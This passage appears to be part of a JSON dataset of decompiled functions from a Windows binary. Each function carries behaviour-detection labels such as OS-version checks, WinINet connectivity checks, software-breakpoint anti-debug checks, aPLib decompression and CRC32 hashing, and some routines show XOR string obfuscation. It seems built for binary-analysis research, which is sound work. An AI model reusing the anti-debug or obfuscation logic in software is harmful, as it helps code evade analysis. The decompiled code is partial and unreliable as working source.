            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00452e13(void)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    puVar2 = 0x464000;\n    do {\n        uVar3 = *puVar2;\n        uVar1 = uVar3;\n        if (uVar3 != 0) {\n            for (; uVar3 < uVar1 + 0x800; uVar3 = uVar3 + 0x40) {\n                if (*(uVar3 + 8) != 0) {\n                    func_0x0072ebea(uVar3 + 0xc);\n                    return;\n                }\n                uVar1 = *puVar2;\n            }\n            fcn.0044f564(*puVar2);\n            *puVar2 = 0;\n        }\n        puVar2 = puVar2 + 1;\n    } while (puVar2 < 0x464100);\n    return;\n}\n",
        "token_count": 216
    },
    "00453b03": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00453b03(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004502c1();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.004502c1();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "00453dcb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453dcb(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0044f426(*(unaff_EBP + -0x28));\n    iVar1 = fcn.004502c1();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.004502c1();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0044f3ff(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00453b63(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "00455930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00455930(uint arg_8h, uint arg_ch, uint arg_10h, int16_t *arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int16_t *piVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    fcn.0044d93a(arg_8h);\n    piVar1 = arg_14h;\n    iVar2 = arg_18h;\n    if (0 < arg_18h) {\n        do {\n            iVar2 = iVar2 + -1;\n            if (*piVar1 == 0) goto code_r0x0045595f;\n            piVar1 = piVar1 + 1;\n        } while (iVar2 != 0);\n        iVar2 = -1;\ncode_r0x0045595f:\n        arg_18h = (arg_18h - iVar2) + -1;\n    }\n    fcn.006280c7(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    return;\n}\n",
        "token_count": 256
    },
    "0045702e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n\nvoid __cdecl\nfcn.0045702e(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t *arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t arg_8h_00;\n    uint32_t uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *unaff_ESI;\n    uint32_t uVar5;\n    bool bVar6;\n    uint uStack80;\n    uint *puStack76;\n    int32_t iStack72;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint32_t var_4h;\n    \n    var_4h = *0x45f8b4 ^ &stack0xfffffffc;\n    uVar1 = *arg_14h;\n    if (arg_8h == arg_ch) goto code_r0x004571d0;\n    iStack72 = arg_8h;\n    puStack76 = 0x457074;\n    uStack80 = func_0x0059ca66();\n    puStack76 = &fcn.0045702e::var_18h;\n    iVar3 = (*unaff_ESI)();\n    pcVar2 = _fcn.0045a0a0;\n    if ((((iVar3 == 0) || (var_18h != 1)) || (iVar3 = (*unaff_ESI)(arg_ch, &fcn.0045702e::var_18h),  iVar3 == 0)) ||\n       (var_18h != 1)) {\n        uVar5 = (*pcVar2)(arg_8h, 1, arg_10h, uVar1, 0, 0);\n        bVar6 = uVar5 == 0;\n        if (bVar6) goto code_r0x004571d0;\n    }\n    else {\n        uVar5 = uVar1;\n        if (uVar1 == 0xffffffff) {\n            iVar3 = fcn.0044efb0(arg_10h);\n            uVar5 = iVar3 + 1;\n        }\n        bVar6 = uVar5 == 0;\n    }\n    puVar4 = &stack0xffffffb0;\n    if ((bVar6 || uVar5 < 0) || (0x7ffffff0 < uVar5)) {\n        var_1ch = NULL;\n    }\n    else {\n        arg_8h_00 = uVar5 * 2 + 8;\n        if (arg_8h_00 < 0x401) {\n            fcn.004571f0();\n            var_1ch = &stack0xffffffb0;\n            if (*0x10 != 0x50) {\n                uStack80 = 0xcccc;\ncode_r0x00457110:\n                var_1ch = puVar4 + 2;\n            }\n        }\n        else {\n            puVar4 = fcn.00450a2f(arg_8h_00);\n            var_1ch = puVar4;\n            if (puVar4 != NULL) {\n                *puVar4 = 0xdddd;\n                goto code_r0x00457110;\n            }\n        }\n    }\n    if (var_1ch != NULL) {\n        fcn.00452080(var_1ch, 0, uVar5 * 2);\n        iVar3 = (*pcVar2)(arg_8h, 1, arg_10h, uVar1, var_1ch, uVar5);\n        if (iVar3 != 0) {\n            if (arg_18h == 0) {\n                func_0x006bfc17();\n                return;\n            }\n            func_0x004a9028(arg_ch, 0, var_1ch, uVar5, arg_18h, arg_1ch, 0, 0);\n            return;\n        }\n        fcn.00451c20(var_1ch);\n    }\ncode_r0x004571d0:\n    fcn.0044f4d8(arg_18h);\n    return;\n}\n",
        "token_count": 993
    },
    "0045752b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0045752b(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0044d93a(arg_8h);\n    if (arg_14h < -1) {\n        if (var_4h != '\\0') {\n            *(var_8h + 0x70) = *(var_8h + 0x70) & 0xfffffffd;\n        }\n        return 0;\n    }\n    uVar1 = fcn.0062bf56(arg_ch, arg_10h, arg_14h, arg_18h);\n    return uVar1;\n}\n",
        "token_count": 196
    },
    "00457a78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00457a78(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004547f4(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004bd800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.004bd800(uint param_1, uint *param_2, int32_t param_3, int32_t *param_4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.005a6249();\n    iVar2 = *(iVar2 + 0x30);\n    if ((param_3 == 3) && (iVar1 = fcn.0059a5f9(iVar2, param_1, *param_2, param_2[1], *(param_2 + 2)),  iVar1 != 0)) {\n        *param_4 = iVar1;\n        return 0;\n    }\n    uVar3 = (**(iVar2 + 0x44))(param_1, param_2, param_3, param_4);\n    return uVar3;\n}\n",
        "token_count": 194
    },
    "00665b08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00665b08(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint32_t unaff_EBX;\n    int32_t unaff_ESI;\n    \n    if (*(unaff_ESI + 0x14) == 0) {\n        uVar5 = fcn.0044d234(*(unaff_ESI + 8));\n        iVar1 = *(unaff_ESI + 4);\n        *(unaff_ESI + 0x14) = uVar5;\n        uVar4 = 0;\n        if (*(unaff_ESI + 8) != 0) {\n            do {\n                uVar2 = uVar4 & 0x1f;\n                uVar3 = uVar4 + 1;\n                *(uVar4 + *(unaff_ESI + 0x14)) =\n                     (unaff_EBX << uVar2 | unaff_EBX >> 0x20 - uVar2) + uVar4 ^ *(uVar4 + iVar1 + param_1);\n                uVar4 = uVar3;\n            } while (uVar3 < *(unaff_ESI + 8));\n        }\n        return *(unaff_ESI + 0x14);\n    }\n    return *(unaff_ESI + 0x14);\n}\n",
        "token_count": 313
    },
    "007ed7bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.007ed7bf(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint32_t var_4h;\n    \n    uVar5 = 0;\n    if (arg_ch != 0) {\n        iVar1 = in_ECX + in_EAX;\n        do {\n            uVar2 = *(iVar1 + 4 + uVar5);\n            if (uVar2 < 8) {\n                return;\n            }\n            var_4h = uVar2 - 8 >> 1;\n            if (var_4h != 0) {\n                puVar6 = iVar1 + 8 + uVar5;\n                do {\n                    uVar3 = *puVar6 & 0xf;\n                    puVar4 = (*puVar6 >> 4) + *(iVar1 + uVar5) + arg_10h;\n                    if (uVar3 == 3) {\n                        *puVar4 = *puVar4 + arg_8h;\n                    }\n                    else if (uVar3 == 10) {\n                        uVar2 = *puVar4;\n                        *puVar4 = *puVar4 + arg_8h;\n                        puVar4[1] = puVar4[1] + (arg_8h >> 0x1f) + CARRY4(uVar2, arg_8h);\n                    }\n                    else if (uVar3 == 1) {\n                        *puVar4 = *puVar4 + (arg_8h >> 0x10);\n                    }\n                    else if (uVar3 == 2) {\n                        *puVar4 = *puVar4 + arg_8h;\n                    }\n                    puVar6 = puVar6 + 1;\n                    var_4h = var_4h - 1;\n                } while (var_4h != 0);\n            }\n            uVar5 = uVar5 + *(iVar1 + 4 + uVar5);\n        } while (uVar5 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 514
    },
    "00826160": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00826160(uint8_t *param_1, char param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    \n    uVar3 = 0;\n    do {\n        uVar1 = *in_EAX;\n        uVar2 = *param_1;\n        param_1 = param_1 + 1;\n        in_EAX = in_EAX + 1;\n        if (param_2 != '\\0') {\n            uVar2 = uVar2 ^ (0x5689695d << (uVar3 & 0x1f) | 0x5689695d >> 0x20 - (uVar3 & 0x1f)) + uVar3;\n            uVar3 = uVar3 + 1;\n        }\n    } while ((uVar2 != 0) && (uVar2 == uVar1));\n    if (uVar2 < uVar1) {\n        return 0xffffffff;\n    }\n    return uVar1 < uVar2;\n}\n",
        "token_count": 251
    },
    "004036a0": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004036a0(int32_t param_1, uint32_t param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h;\n    int32_t arg_10h;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    uint32_t var_8h;\n    int32_t var_ch_2;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_3;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x42a870;\n    var_ch_3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_3;\n    uVar4 = var_8h | 0xf;\n    if (uVar4 != 0xffffffff) {\n        uVar1 = *(param_1 + 0x18);\n        uVar3 = uVar1 >> 1;\n        var_8h = uVar4;\n        if ((uVar4 / 3 < uVar3) && (uVar1 <= -uVar3 - 2)) {\n            var_8h = uVar3 + uVar1;\n        }\n    }\n    var_4h = 0;\n    arg_8h = fcn.004031a0(var_8h + 1, 0);\n    if (var_ch_2 != 0) {\n        if (*(param_1 + 0x18) < 0x10) {\n            arg_10h = param_1 + 4;\n        }\n        else {\n            arg_10h = *(param_1 + 4);\n        }\n        fcn.00410d14(arg_8h, var_8h + 1, arg_10h, var_ch_2);\n    }\n    if (0xf < *(param_1 + 0x18)) {\n        fcn.00405af2(*(param_1 + 4));\n    }\n    puVar2 = param_1 + 4;\n    *puVar2 = 0;\n    *puVar2 = arg_8h;\n    *(param_1 + 0x18) = var_8h;\n    *(param_1 + 0x14) = var_ch_2;\n    if (0xf < var_8h) {\n        puVar2 = arg_8h;\n    }\n    *(puVar2 + var_ch_2) = 0;\n    *in_FS_OFFSET = var_ch_3;\n    return;\n}\n",
        "token_count": 582
    },
    "00405b2f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405b2f(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    if (arg_ch * arg_10h >> 0x20 != 0) {\n        return 0x80070057;\n    }\n    *arg_8h = arg_ch * arg_10h;\n    return 0;\n}\n",
        "token_count": 86
    },
    "004067e7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004067e7(int32_t *param_1)\n\n{\n    if (param_1[1] != 0) {\n        fcn.00405af2(param_1[1]);\n        param_1[1] = 0;\n    }\n    if (param_1[2] != 0) {\n        fcn.00405af2(param_1[2]);\n        param_1[2] = 0;\n    }\n    if (param_1[3] != 0) {\n        if (param_1[3] != -1) {\n            (**(*param_1 + 0x48))();\n        }\n        param_1[3] = 0;\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "0040695e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040695e(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint arg_20h)\n\n{\n    uint *in_ECX;\n    int64_t iVar1;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    if (0x76b < arg_8h) goto code_r0x0040697c;\n    do {\n        do {\n            fcn.00401000();\ncode_r0x0040697c:\n        } while ((((0xb < arg_ch - 1U) || (0x1e < arg_10h - 1U)) || (0x17 < arg_14h)) ||\n                ((0x3b < arg_18h || (0x3b < arg_1ch))));\n        var_24h = arg_1ch;\n        var_10h = arg_8h + -0x76c;\n        var_4h = arg_20h;\n        var_14h = arg_ch + -1;\n        var_20h = arg_18h;\n        var_1ch = arg_14h;\n        var_18h = arg_10h;\n        iVar1 = fcn.00412d42(&var_24h);\n        *in_ECX = iVar1;\n        in_ECX[1] = iVar1 >> 0x20;\n    } while (iVar1 == -1);\n    return;\n}\n",
        "token_count": 393
    },
    "00406bfc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406bfc(int32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (arg_8h == -1) {\n        arg_8h = fcn.00406ab0(*in_ECX, *(*in_ECX + -8));\n    }\n    fcn.00403020(arg_8h);\n    return;\n}\n",
        "token_count": 86
    },
    "00407730": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00407730(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.AFX_MODULE_STATE.0;\n    puVar1 = extraout_ECX[0x12];\n    *(unaff_EBP + -4) = 1;\n    if (puVar1 != NULL) {\n        (***puVar1)(1);\n    }\n    if (extraout_ECX[0x1c] != NULL) {\n        (**(*extraout_ECX[0x1c] + 0xc))(extraout_ECX + 0x13);\n        if (extraout_ECX[0x1c] != NULL) {\n            (**(*extraout_ECX[0x1c] + 4))(1);\n        }\n    }\n    if (*extraout_ECX[0x1e] != NULL) {\n        (****extraout_ECX[0x1e])(1);\n    }\n    if (*(extraout_ECX[0x1e] + 4) != NULL) {\n        (****(extraout_ECX[0x1e] + 4))(1);\n    }\n    fcn.00405af2(extraout_ECX[0x1e]);\n    pcVar2 = extraout_ECX[0x20];\n    if ((pcVar2 != NULL) && (pcVar2 != 0xffffffff)) {\n        fcn.00407524(pcVar2);\n        extraout_ECX[0x20] = 0xffffffff;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004085a8();\n    fcn.00401020();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 452
    },
    "0040808a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0040808a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    fcn.00403540();\n    *(unaff_EBP + -4) = 0;\n    fcn.00405dd3(*(unaff_EBP + 8));\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    if (arg_10h_00 == -1) {\n        arg_10h_00 = *(unaff_EBP + 8);\n    }\n    fcn.00408057(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), arg_10h_00);\n    fcn.00401020();\n    fcn.00412353();\n    return;\n}\n",
        "token_count": 252
    },
    "00408327": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408327(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    param_1[5] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar1 = fcn.005dda34();\n    *param_1 = iVar1;\n    if (iVar1 == -1) {\n        fcn.00405f5e();\n    }\n    fcn.004a8f36(param_1 + 7);\n    return;\n}\n",
        "token_count": 155
    },
    "00409e33": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409e33(int32_t **arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    int32_t **ppiVar1;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *arg_8h;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(in_ECX + 8) != 0) {\n                ppiVar1 = *(in_ECX + 4);\n                do {\n                    piVar3 = *ppiVar1;\n                    if (piVar3 != NULL) goto code_r0x00409e67;\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar4 < *(in_ECX + 8));\n                fcn.00405f96();\n                in_ECX = extraout_ECX;\n            }\n        }\ncode_r0x00409e67:\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(in_ECX + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(in_ECX + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *arg_8h = piVar5;\n        *arg_ch = piVar3[1];\n        *arg_10h = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 472
    },
    "0040a482": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a482(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    \n    arg_8h_00 = arg_8h;\n    iVar3 = 0;\n    if (-1 < arg_8h) goto code_r0x0040a49a;\n    do {\n        fcn.00405f96();\ncode_r0x0040a49a:\n        if (iVar3 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (arg_8h_00 == iVar3) {\n            fcn.00405af2(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar3;\n            *(in_ECX + 8) = iVar3;\n            goto code_r0x0040a58a;\n        }\n        if (*(in_ECX + 4) == iVar3) {\n            uVar1 = fcn.00405ac3(arg_8h_00);\n            *(in_ECX + 4) = uVar1;\n            fcn.00410fb0(uVar1, iVar3, arg_8h_00);\n            *(in_ECX + 0xc) = arg_8h_00;\ncode_r0x0040a501:\n            *(in_ECX + 8) = arg_8h_00;\n            return;\n        }\n        iVar3 = *(in_ECX + 0xc);\n        if (arg_8h_00 <= iVar3) {\n            iVar3 = *(in_ECX + 8);\n            if (iVar3 < arg_8h_00) {\n                fcn.00410fb0(iVar3 + *(in_ECX + 4), 0, arg_8h_00 - iVar3);\n            }\n            goto code_r0x0040a501;\n        }\n        iVar2 = *(in_ECX + 0x10);\n        if (iVar2 == 0) {\n            iVar2 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar2 < 4) {\ncode_r0x0040a533:\n                iVar2 = 4;\n            }\n            else if (iVar2 < 0x401) {\n                if (iVar2 < 4) goto code_r0x0040a533;\n            }\n            else {\n                iVar2 = 0x400;\n            }\n        }\n        arg_8h = iVar2 + iVar3;\n        if (iVar2 + iVar3 <= arg_8h_00) {\n            arg_8h = arg_8h_00;\n        }\n    } while (arg_8h < iVar3);\n    iVar3 = fcn.00405ac3(arg_8h);\n    fcn.00405b53(iVar3, arg_8h, *(in_ECX + 4), *(in_ECX + 8));\n    fcn.00410fb0(*(in_ECX + 8) + iVar3, 0, arg_8h_00 - *(in_ECX + 8));\n    fcn.00405af2(*(in_ECX + 4));\n    *(in_ECX + 8) = arg_8h_00;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0040a58a:\n    *(in_ECX + 4) = iVar3;\n    return;\n}\n",
        "token_count": 804
    },
    "00411871": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411871(uint arg_8h)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t **arg_8h_00;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004146d8(0x432b48, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == NULL) {\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        goto code_r0x00411964;\n    }\n    fcn.0041aab9(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar3 = fcn.0041a799(arg_8h_00);\n        if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n            iVar4 = 0x4367d8;\n        }\n        else {\n            iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x439de0);\n        }\n        if ((*(iVar4 + 0x24) & 0x7f) == 0) {\n            if ((uVar3 == 0xffffffff) || (uVar3 == 0xfffffffe)) {\n                iVar4 = 0x4367d8;\n            }\n            else {\n                iVar4 = (uVar3 & 0x1f) * 0x40 + *((uVar3 >> 5) * 4 + 0x439de0);\n            }\n            if ((*(iVar4 + 0x24) & 0x80) == 0) goto code_r0x00411937;\n        }\n        puVar2 = fcn.004125de();\n        *puVar2 = 0x16;\n        fcn.00415a3c(0, 0, 0, 0, 0);\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x00411937:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar3 = fcn.0041ab97(arg_8h_00);\n        }\n        else {\n            uVar3 = **arg_8h_00;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0041196d();\ncode_r0x00411964:\n    fcn.0041471d();\n    return;\n}\n",
        "token_count": 783
    },
    "00412d71": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00412dc6)\n\nint32_t __cdecl fcn.00412d71(int32_t arg_8h, char *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *unaff_EDI;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n        iVar3 = fcn.0041dde2(arg_8h, arg_10h);\n        return iVar3;\n    }\n    uVar1 = func_0x004d7864();\n    if (arg_8h == 0) {\n        uVar2 = (*unaff_EDI)(uVar1, 0, 0, 0);\n        if (uVar2 == 0) goto code_r0x00412da5;\n        if (arg_10h <= uVar2) {\n            arg_10h = uVar2;\n        }\n        var_4h = fcn.004153ec(arg_10h, 1);\n        if (var_4h == 0) {\n            puVar4 = fcn.004125de();\n            *puVar4 = 0xc;\n            return 0;\n        }\n    }\n    else {\n        if (arg_10h == 0) {\n            puVar4 = fcn.004125de();\n            *puVar4 = 0x16;\n            fcn.00415a3c(0, 0, 0, 0, 0);\n            return 0;\n        }\n        var_4h = arg_8h;\n    }\n    uVar2 = (*unaff_EDI)(arg_ch, arg_10h, var_4h, &var_8h);\n    if (arg_10h <= uVar2) {\n        if (arg_8h == 0) {\n            